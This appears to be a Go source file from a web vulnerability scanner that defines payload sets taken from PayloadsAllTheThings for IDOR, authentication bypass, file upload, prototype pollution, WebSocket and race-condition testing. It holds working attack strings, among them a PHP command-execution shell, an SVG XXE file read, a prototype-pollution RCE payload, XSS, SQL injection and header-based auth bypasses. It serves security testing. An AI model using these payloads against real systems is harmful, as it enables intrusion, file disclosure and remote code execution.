package payloads

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// IDOR / Auth Bypass / File Upload / Prototype Pollution / WebSocket /
// Race Condition Payloads
// Sourced from PayloadsAllTheThings respective sections
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• IDOR â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

func IDORPayloads() PayloadSet {
	return PayloadSet{
		Category:    CatIDOR,
		Description: "Insecure Direct Object Reference â€” PayloadsAllTheThings + CWE-639",
		Version:     "2.0.0",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References",
		Payloads: []Payload{
			{
				ID: "idor-sequential-inc", Category: CatIDOR,
				Technique: TechSequentialID,
				Name: "Sequential ID Increment", Value: `{{ORIGINAL_ID + 1}}`,
				Contexts:  []InjectionContext{CtxURLQuery, CtxURLPath, CtxFormBody, CtxJSONBody},
				Detection: DetectContentDiff,
				Severity: SevHigh, SafeMode: true, CVSSScore: 7.5,
				CWE: "CWE-639", OWASPCategory: "A01:2021",
				Description: "Increment numeric ID by 1 â€” tests horizontal privilege escalation",
				Reference: "PayloadsAllTheThings", Tags: []string{"sequential"}, Enabled: true,
			},
			{
				ID: "idor-sequential-dec", Category: CatIDOR,
				Technique: TechSequentialID,
				Name: "Sequential ID Decrement", Value: `{{ORIGINAL_ID - 1}}`,
				Contexts:  []InjectionContext{CtxURLQuery, CtxURLPath, CtxFormBody, CtxJSONBody},
				Detection: DetectContentDiff,
				Severity: SevHigh, SafeMode: true, CVSSScore: 7.5,
				CWE: "CWE-639", OWASPCategory: "A01:2021",
				Description: "Decrement numeric ID by 1 â€” previous user's resource access",
				Reference: "PayloadsAllTheThings", Tags: []string{"sequential"}, Enabled: true,
			},
			{
				ID: "idor-zero-id", Category: CatIDOR,
				Technique: TechSequentialID,
				Name: "ID=0 Admin Probe", Value: `0`,
				Contexts:  []InjectionContext{CtxURLQuery, CtxURLPath, CtxFormBody},
				Detection: DetectContentDiff,
				Severity: SevHigh, SafeMode: true, CVSSScore: 7.5,
				CWE: "CWE-639", OWASPCategory: "A01:2021",
				Description: "ID=0 often maps to admin/superuser in many frameworks",
				Reference: "PayloadsAllTheThings", Tags: []string{"zero_id"}, Enabled: true,
			},
			{
				ID: "idor-uuid-nil", Category: CatIDOR,
				Technique: TechEncodedID,
				Name: "Nil UUID", Value: `00000000-0000-0000-0000-000000000000`,
				Contexts:  []InjectionContext{CtxURLQuery, CtxURLPath, CtxJSONBody},
				Detection: DetectContentDiff,
				Severity: SevHigh, SafeMode: true, CVSSScore: 7.5,
				CWE: "CWE-639", OWASPCategory: "A01:2021",
				Description: "Nil UUID â€” may map to default/admin resource in UUID-based systems",
				Reference: "PayloadsAllTheThings", Tags: []string{"uuid"}, Enabled: true,
			},
			{
				ID: "idor-array-wrap", Category: CatIDOR,
				Technique: TechParamTampering,
				Name: "Array Parameter Wrap", Value: `[1,2,3]`,
				Contexts:  []InjectionContext{CtxJSONBody, CtxURLQuery},
				Detection: DetectContentDiff,
				Severity: SevHigh, SafeMode: true, CVSSScore: 7.5,
				CWE: "CWE-639", OWASPCategory: "A01:2021",
				Description: "Wrap scalar ID in array â€” may bypass per-object authorization",
				Reference: "PayloadsAllTheThings", Tags: []string{"array_wrap"}, Enabled: true,
			},
			{
				ID: "idor-param-pollution", Category: CatIDOR,
				Technique: TechParamTampering,
				Name: "HTTP Parameter Pollution", Value: `id=own&id=victim`,
				Contexts:  []InjectionContext{CtxURLQuery, CtxFormBody},
				Detection: DetectContentDiff,
				Severity: SevHigh, SafeMode: true, CVSSScore: 7.5,
				CWE: "CWE-639", OWASPCategory: "A01:2021",
				Description: "Duplicate parameter â€” server may use last value bypassing first check",
				Reference: "PayloadsAllTheThings", Tags: []string{"hpp"}, Enabled: true,
			},
		},
	}
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• Auth Bypass â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

func AuthBypassPayloads() PayloadSet {
	return PayloadSet{
		Category:    CatAuthBypass,
		Description: "Authentication Bypass â€” PayloadsAllTheThings + CWE-287",
		Version:     "2.0.0",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Authentication%20Bypass",
		Payloads: []Payload{
			{
				ID: "auth-bypass-verb-tampering", Category: CatAuthBypass,
				Technique: TechMethodOverride,
				Name: "HTTP Verb Tampering", Value: `PATCH`,
				Contexts:  []InjectionContext{CtxHTTPHeader},
				Detection: DetectStatusCode,
				Severity: SevHigh, SafeMode: true, CVSSScore: 8.1,
				CWE: "CWE-287", OWASPCategory: "A07:2021",
				Description: "Use non-standard HTTP method (PATCH/TRACE/OPTIONS) to bypass auth middleware",
				Reference: "PayloadsAllTheThings", Tags: []string{"verb_tampering"}, Enabled: true,
			},
			{
				ID: "auth-bypass-path-normalize", Category: CatAuthBypass,
				Technique: TechFilterBypass,
				Name: "Path Normalization Bypass", Value: `/admin/..;/admin/dashboard`,
				Contexts:  []InjectionContext{CtxURLPath},
				Detection: DetectStatusCode,
				Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
				CWE: "CWE-287", OWASPCategory: "A07:2021",
				Description: "Path normalization confusion with ..;/ â€” Tomcat/IIS/Spring bypass",
				Reference: "PayloadsAllTheThings", Tags: []string{"path_normalize"}, Enabled: true,
			},
			{
				ID: "auth-bypass-case-change", Category: CatAuthBypass,
				Technique: TechFilterBypass,
				Name: "URL Case Change", Value: `/Admin`,
				Contexts:  []InjectionContext{CtxURLPath},
				Detection: DetectStatusCode,
				Severity: SevHigh, SafeMode: true, CVSSScore: 8.1,
				CWE: "CWE-287", OWASPCategory: "A07:2021",
				Description: "URL case change â€” case-sensitive routing may bypass case-insensitive auth",
				Reference: "PayloadsAllTheThings", Tags: []string{"case_change"}, Enabled: true,
			},
			{
				ID: "auth-bypass-trailing-slash", Category: CatAuthBypass,
				Technique: TechFilterBypass,
				Name: "Trailing Slash Bypass", Value: `/admin/`,
				Contexts:  []InjectionContext{CtxURLPath},
				Detection: DetectStatusCode,
				Severity: SevHigh, SafeMode: true, CVSSScore: 8.1,
				CWE: "CWE-287", OWASPCategory: "A07:2021",
				Description: "Trailing slash difference â€” /admin vs /admin/ may route differently",
				Reference: "PayloadsAllTheThings", Tags: []string{"trailing_slash"}, Enabled: true,
			},
			{
				ID: "auth-bypass-x-original-url", Category: CatAuthBypass,
				Technique: TechFilterBypass,
				Name: "X-Original-URL Override", Value: `/admin`,
				Contexts:  []InjectionContext{CtxHTTPHeader},
				Detection: DetectStatusCode,
				Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
				CWE: "CWE-287", OWASPCategory: "A07:2021",
				Description: "X-Original-URL header to bypass reverse proxy path-based auth",
				Reference: "PayloadsAllTheThings", Tags: []string{"x_original_url"}, Enabled: true,
			},
			{
				ID: "auth-bypass-x-rewrite-url", Category: CatAuthBypass,
				Technique: TechFilterBypass,
				Name: "X-Rewrite-URL Override", Value: `/admin`,
				Contexts:  []InjectionContext{CtxHTTPHeader},
				Detection: DetectStatusCode,
				Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
				CWE: "CWE-287", OWASPCategory: "A07:2021",
				Description: "X-Rewrite-URL header to bypass URL rewriting auth rules",
				Reference: "PayloadsAllTheThings", Tags: []string{"x_rewrite_url"}, Enabled: true,
			},
			{
				ID: "auth-bypass-ip-spoof-127001", Category: CatAuthBypass,
				Technique: TechFilterBypass,
				Name: "IP Spoof via X-Forwarded-For", Value: `127.0.0.1`,
				Contexts:  []InjectionContext{CtxHTTPHeader},
				Detection: DetectStatusCode,
				Severity: SevHigh, SafeMode: true, CVSSScore: 8.1,
				CWE: "CWE-287", OWASPCategory: "A07:2021",
				Description: "X-Forwarded-For: 127.0.0.1 to bypass IP-based access controls",
				Reference: "PayloadsAllTheThings", Tags: []string{"ip_spoof"}, Enabled: true,
			},
		},
	}
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• File Upload â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

func FileUploadPayloads() PayloadSet {
	return PayloadSet{
		Category:    CatFileUpload,
		Description: "File Upload Vulnerabilities â€” PayloadsAllTheThings + CWE-434",
		Version:     "2.0.0",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files",
		Payloads: []Payload{
			{
				ID: "upload-php-ext", Category: CatFileUpload,
				Technique: TechExtBypass,
				Name: "PHP Extension Bypass (.pht)", Value: `vyomite.pht`,
				Contexts:  []InjectionContext{CtxMultipart},
				Detection: DetectReflection, DetectSignature: `(?i)(phpinfo|PHP Version)`,
				Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
				TargetStack: []string{"PHP"}, CWE: "CWE-434", OWASPCategory: "A04:2021",
				Description: "Alternative PHP extension (.pht, .phtml, .php5) to bypass extension blacklist",
				Reference: "PayloadsAllTheThings", Tags: []string{"ext_bypass", "php"}, Enabled: true,
			},
			{
				ID: "upload-double-ext", Category: CatFileUpload,
				Technique: TechDoubleExt,
				Name: "Double Extension (.php.jpg)", Value: `vyomite.php.jpg`,
				Contexts:  []InjectionContext{CtxMultipart},
				Detection: DetectReflection, DetectSignature: `(?i)(phpinfo|PHP Version)`,
				Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
				TargetStack: []string{"PHP", "Apache"}, CWE: "CWE-434", OWASPCategory: "A04:2021",
				Description: "Double extension â€” Apache may process .php.jpg as PHP",
				Reference: "PayloadsAllTheThings", Tags: []string{"double_ext"}, Enabled: true,
			},
			{
				ID: "upload-null-byte-ext", Category: CatFileUpload,
				Technique: TechNullByteExt,
				Name: "Null Byte Extension (.php%00.jpg)", Value: "vyomite.php%00.jpg",
				Contexts:  []InjectionContext{CtxMultipart},
				Detection: DetectReflection, DetectSignature: `(?i)(phpinfo|PHP Version)`,
				Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
				TargetStack: []string{"PHP"}, CWE: "CWE-434", OWASPCategory: "A04:2021",
				Description: "Null byte truncation in filename â€” PHP <5.3.4 processes before null",
				Reference: "PayloadsAllTheThings", Tags: []string{"null_byte"}, Enabled: true,
			},
			{
				ID: "upload-mime-bypass", Category: CatFileUpload,
				Technique: TechMIMEBypass,
				Name: "MIME Type Bypass (image/jpeg)", Value: `image/jpeg`,
				Contexts:  []InjectionContext{CtxMultipart, CtxHTTPHeader},
				Detection: DetectStatusCode,
				Severity: SevHigh, SafeMode: true, CVSSScore: 8.1,
				CWE: "CWE-434", OWASPCategory: "A04:2021",
				Description: "Set Content-Type to image/jpeg while uploading executable â€” MIME-only validation bypass",
				Reference: "PayloadsAllTheThings", Tags: []string{"mime_bypass"}, Enabled: true,
			},
			{
				ID: "upload-magic-bytes-gif", Category: CatFileUpload,
				Technique: TechMagicBytes,
				Name: "GIF Magic Bytes + PHP", Value: "GIF89a\n<?php system('id'); ?>",
				Contexts:  []InjectionContext{CtxMultipart},
				Detection: DetectReflection, DetectSignature: `uid=[0-9]+\(`,
				Severity: SevCritical, SafeMode: false, CVSSScore: 9.8,
				TargetStack: []string{"PHP"}, CWE: "CWE-434", OWASPCategory: "A04:2021",
				Description: "GIF89a magic bytes prepended to PHP shell â€” bypasses magic byte validation",
				Reference: "PayloadsAllTheThings", Tags: []string{"magic_bytes"}, Enabled: true,
			},
			{
				ID: "upload-svg-xxe", Category: CatFileUpload,
				Technique: TechExtBypass,
				Name: "SVG Upload with XXE", Value: `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`,
				Contexts:  []InjectionContext{CtxMultipart},
				Detection: DetectReflection, DetectSignature: `.+`,
				Severity: SevHigh, SafeMode: false, CVSSScore: 7.5,
				CWE: "CWE-611", OWASPCategory: "A05:2021",
				Description: "SVG file with embedded XXE â€” parsed by image processing libraries",
				Reference: "PayloadsAllTheThings", Tags: []string{"svg", "xxe"}, Enabled: true,
			},
			{
				ID: "upload-asp-ext", Category: CatFileUpload,
				Technique: TechExtBypass,
				Name: "ASP Extension Bypass (.aspx)", Value: `vyomite.aspx`,
				Contexts:  []InjectionContext{CtxMultipart},
				Detection: DetectStatusCode,
				Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
				TargetStack: []string{".NET", "IIS"}, CWE: "CWE-434", OWASPCategory: "A04:2021",
				Description: "ASP.NET web shell upload via .aspx extension â€” IIS targets",
				Reference: "PayloadsAllTheThings", Tags: []string{"ext_bypass", "asp"}, Enabled: true,
			},
			{
				ID: "upload-jsp-ext", Category: CatFileUpload,
				Technique: TechExtBypass,
				Name: "JSP Extension Bypass (.jspx)", Value: `vyomite.jspx`,
				Contexts:  []InjectionContext{CtxMultipart},
				Detection: DetectStatusCode,
				Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
				TargetStack: []string{"Java", "Tomcat"}, CWE: "CWE-434", OWASPCategory: "A04:2021",
				Description: "Java JSP web shell upload via .jspx extension â€” Tomcat targets",
				Reference: "PayloadsAllTheThings", Tags: []string{"ext_bypass", "jsp"}, Enabled: true,
			},
		},
	}
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• Prototype Pollution â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

func PrototypePollutionPayloads() PayloadSet {
	return PayloadSet{
		Category:    CatPrototypePollut,
		Description: "Prototype Pollution â€” PayloadsAllTheThings + CWE-1321",
		Version:     "2.0.0",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution",
		Payloads: []Payload{
			{
				ID: "protopoll-proto-json", Category: CatPrototypePollut,
				Technique: TechProtoOverwrite,
				Name: "__proto__ JSON Injection", Value: `{"__proto__":{"vyomite_polluted":true}}`,
				Contexts:  []InjectionContext{CtxJSONBody},
				Detection: DetectReflection, DetectSignature: `vyomite_polluted`,
				Severity: SevHigh, SafeMode: true, CVSSScore: 8.1,
				TargetStack: []string{"Node.js", "JavaScript"}, CWE: "CWE-1321", OWASPCategory: "A03:2021",
				Description: "JSON __proto__ pollution â€” adds property to all Object instances",
				Reference: "PayloadsAllTheThings", Tags: []string{"proto_json"}, Enabled: true,
			},
			{
				ID: "protopoll-proto-url-param", Category: CatPrototypePollut,
				Technique: TechProtoOverwrite,
				Name: "__proto__ URL Parameter", Value: `__proto__[vyomite_polluted]=true`,
				Contexts:  []InjectionContext{CtxURLQuery, CtxFormBody},
				Detection: DetectReflection, DetectSignature: `vyomite_polluted`,
				Severity: SevHigh, SafeMode: true, CVSSScore: 8.1,
				TargetStack: []string{"Node.js", "JavaScript"}, CWE: "CWE-1321", OWASPCategory: "A03:2021",
				Description: "URL parameter __proto__ pollution â€” qs/express body parser vulnerable",
				Reference: "PayloadsAllTheThings", Tags: []string{"proto_url"}, Enabled: true,
			},
			{
				ID: "protopoll-constructor-proto", Category: CatPrototypePollut,
				Technique: TechConstructorPoll,
				Name: "constructor.prototype Pollution", Value: `{"constructor":{"prototype":{"vyomite_polluted":true}}}`,
				Contexts:  []InjectionContext{CtxJSONBody},
				Detection: DetectReflection, DetectSignature: `vyomite_polluted`,
				Severity: SevHigh, SafeMode: true, CVSSScore: 8.1,
				TargetStack: []string{"Node.js", "JavaScript"}, CWE: "CWE-1321", OWASPCategory: "A03:2021",
				Description: "constructor.prototype pollution â€” bypasses __proto__ filters",
				Reference: "PayloadsAllTheThings", Tags: []string{"constructor"}, Enabled: true,
			},
			{
				ID: "protopoll-isadmin", Category: CatPrototypePollut,
				Technique: TechProtoOverwrite,
				Name: "isAdmin Pollution", Value: `{"__proto__":{"isAdmin":true}}`,
				Contexts:  []InjectionContext{CtxJSONBody},
				Detection: DetectContentDiff,
				Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
				TargetStack: []string{"Node.js", "JavaScript"}, CWE: "CWE-1321", OWASPCategory: "A03:2021",
				Description: "Pollute isAdmin property â€” privilege escalation via missing hasOwnProperty",
				Reference: "PayloadsAllTheThings", Tags: []string{"privilege_escalation"}, Enabled: true,
			},
			{
				ID: "protopoll-rce-shell", Category: CatPrototypePollut,
				Technique: TechProtoOverwrite,
				Name: "Prototype RCE via child_process", Value: `{"__proto__":{"shell":"/proc/self/exe","NODE_OPTIONS":"--require /proc/self/cmdline"}}`,
				Contexts:  []InjectionContext{CtxJSONBody},
				Detection: DetectOOBCallback,
				Severity: SevCritical, SafeMode: false, CVSSScore: 9.8,
				TargetStack: []string{"Node.js"}, CWE: "CWE-1321", OWASPCategory: "A03:2021",
				Description: "Prototype pollution to RCE via child_process spawn options",
				Reference: "PayloadsAllTheThings", Tags: []string{"rce"}, Enabled: true,
			},
		},
	}
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• WebSocket â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

func WebSocketPayloads() PayloadSet {
	return PayloadSet{
		Category:    CatWebSocket,
		Description: "WebSocket Vulnerabilities â€” PayloadsAllTheThings + CWE-1385",
		Version:     "2.0.0",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Sockets",
		Payloads: []Payload{
			{
				ID: "ws-xss-injection", Category: CatWebSocket,
				Technique: TechReflectedXSS,
				Name: "WebSocket XSS", Value: `<img src=x onerror=alert('VYO-WS-001')>`,
				Contexts:  []InjectionContext{CtxWebSocket},
				Detection: DetectReflection, DetectSignature: `(?i)(onerror=|alert\()`,
				Severity: SevHigh, SafeMode: true, CVSSScore: 7.5,
				CWE: "CWE-79", OWASPCategory: "A03:2021",
				Description: "XSS payload via WebSocket â€” reflected if server echoes messages to DOM",
				Reference: "PayloadsAllTheThings", Tags: []string{"xss"}, Enabled: true,
			},
			{
				ID: "ws-sqli-injection", Category: CatWebSocket,
				Technique: TechProbe,
				Name: "WebSocket SQLi", Value: `' OR 1=1-- -`,
				Contexts:  []InjectionContext{CtxWebSocket},
				Detection: DetectErrorPattern, DetectSignature: `(?i)(sql.syntax|unterminated)`,
				Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
				CWE: "CWE-89", OWASPCategory: "A03:2021",
				Description: "SQL injection via WebSocket messages â€” bypasses WAFs that ignore WS traffic",
				Reference: "PayloadsAllTheThings", Tags: []string{"sqli"}, Enabled: true,
			},
			{
				ID: "ws-cswsh-origin", Category: CatWebSocket,
				Technique: TechClassic,
				Name: "Cross-Site WebSocket Hijacking", Value: `Origin: https://evil.vyomite.example.com`,
				Contexts:  []InjectionContext{CtxHTTPHeader},
				Detection: DetectStatusCode,
				Severity: SevHigh, SafeMode: true, CVSSScore: 8.1,
				CWE: "CWE-1385", OWASPCategory: "A01:2021",
				Description: "CSWSH â€” WebSocket upgrade with attacker Origin to test origin validation",
				Reference: "PayloadsAllTheThings", Tags: []string{"cswsh"}, Enabled: true,
			},
		},
	}
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• Race Condition â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

func RaceConditionPayloads() PayloadSet {
	return PayloadSet{
		Category:    CatRaceCondition,
		Description: "Race Condition / TOCTOU â€” PayloadsAllTheThings + CWE-362",
		Version:     "2.0.0",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Race%20Condition",
		Payloads: []Payload{
			{
				ID: "race-duplicate-request", Category: CatRaceCondition,
				Technique: TechTOCTOU,
				Name: "Duplicate Request Race", Value: `CONCURRENT_DUPLICATE`,
				Contexts:  []InjectionContext{CtxFormBody, CtxJSONBody},
				Detection: DetectContentDiff,
				Severity: SevHigh, SafeMode: true, CVSSScore: 8.1,
				CWE: "CWE-362", OWASPCategory: "A04:2021",
				Description: "Send identical requests concurrently â€” tests for double-spend/double-action bugs",
				Reference: "PayloadsAllTheThings", Tags: []string{"toctou", "duplicate"}, Enabled: true,
			},
			{
				ID: "race-last-byte-sync", Category: CatRaceCondition,
				Technique: TechLastByteSync,
				Name: "Last-Byte Synchronization", Value: `LAST_BYTE_SYNC`,
				Contexts:  []InjectionContext{CtxFormBody, CtxJSONBody},
				Detection: DetectContentDiff,
				Severity: SevHigh, SafeMode: true, CVSSScore: 8.1,
				CWE: "CWE-362", OWASPCategory: "A04:2021",
				Description: "HTTP/2 single-packet attack â€” synchronize final byte for precise race window",
				Reference: "PayloadsAllTheThings", Tags: []string{"last_byte", "http2"}, Enabled: true,
			},
			{
				ID: "race-limit-bypass", Category: CatRaceCondition,
				Technique: TechTOCTOU,
				Name: "Rate Limit Race Bypass", Value: `RATE_LIMIT_RACE`,
				Contexts:  []InjectionContext{CtxFormBody, CtxJSONBody, CtxURLQuery},
				Detection: DetectContentDiff,
				Severity: SevMedium, SafeMode: true, CVSSScore: 6.5,
				CWE: "CWE-362", OWASPCategory: "A04:2021",
				Description: "Concurrent requests to bypass rate limiting â€” coupon/discount reuse",
				Reference: "PayloadsAllTheThings", Tags: []string{"rate_limit"}, Enabled: true,
			},
		},
	}
}
